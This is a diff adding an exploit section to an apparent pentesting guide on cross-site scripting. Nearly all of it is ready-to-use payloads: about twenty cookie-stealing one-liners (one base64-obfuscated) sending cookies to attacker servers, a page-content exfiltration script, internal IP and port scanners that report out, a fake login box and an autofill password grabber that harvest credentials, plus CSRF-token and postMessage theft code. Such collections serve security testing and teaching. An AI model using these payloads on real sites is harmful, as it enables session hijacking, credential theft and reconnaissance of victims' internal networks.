@@ -133,6 +133,187 @@ This will **copy the JS file locally** and you will be able to **modify that cop
 
 ## Exploit code or POC
 
+### Several payloads in 1
+
+{% content-ref url="steal-info-js.md" %}
+[steal-info-js.md](steal-info-js.md)
+{% endcontent-ref %}
+
+### Retrieve Cookies
+
+```javascript
+<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
+<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
+<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
+<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
+<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
+<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
+<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
+<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
+<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
+<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
+<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
+<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
+```
+
+{% hint style="info" %}
+You **won't be able to access the cookies from JavaScript** if the HTTPOnly flag is set in the cookie. But here you have [some ways to bypass this protection](../hacking-with-cookies/#httponly) if you are lucky enough.
+{% endhint %}
+
+### Steal Page Content
+
+```javascript
+var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
+var attacker = "http://10.10.14.8/exfil";
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+xhr.open('GET', url, true);
+xhr.send(null);
+```
+
+### Find internal IPs
+
+```html
+<script>
+var q = []
+var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
+var wait = 2000
+var n_threads = 51
+
+// Prepare the fetchUrl functions to access all the possible
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(){
+        fetchUrl(url, wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+
+// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
+for(i=1; i<=n_threads; i++){
+  if(q.length) q.shift()();
+}
+
+function fetchUrl(url, wait){
+    console.log(url)
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+    }
+  ))
+  .catch(e => {
+  if(!String(e).includes("The user aborted a request") && q.length) {
+    q.shift()();
+  }
+  });
+
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()();
+  }
+  }, wait);
+}
+</script>
+```
+
+### Port Scanner (fetch)
+
+```javascript
+const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
+```
+
+### Port Scanner (websockets)
+
+```python
+var ports = [80, 443, 445, 554, 3306, 3690, 1234];
+for(var i=0; i<ports.length; i++) {
+    var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
+    s.start = performance.now();
+    s.port = ports[i];
+    s.onerror = function() {
+        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
+    };
+    s.onopen = function() {
+        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
+    };
+}
+```
+
+_Short times indicate a responding port_ _Longer times indicate no response._
+
+Review the list of ports banned in Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net\_util.cc) and in Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).
+
+### Box to ask for credentials
+
+```markup
+<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
+```
+
+### Auto-fill passwords capture
+
+```javascript
+<b>Username:</><br>
+<input name=username id=username>
+<b>Password:</><br>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.
+
+### Keylogger
+
+Just searching in github I found a few different ones:
+
+* [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
+* [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
+* [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
+* You can also use metasploit `http_javascript_keylogger`
+
+### Stealing CSRF tokens
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/email',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
+### Stealing PostMessage messages
+
+```markup
+<img src="https://attacker.com/?" id=message>
+<script>
+ window.onmessage = function(e){
+ document.getElementById("message").src += "&"+e.data;
+</script>
+```
+
 ### Data grabber for XSS
 
 Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
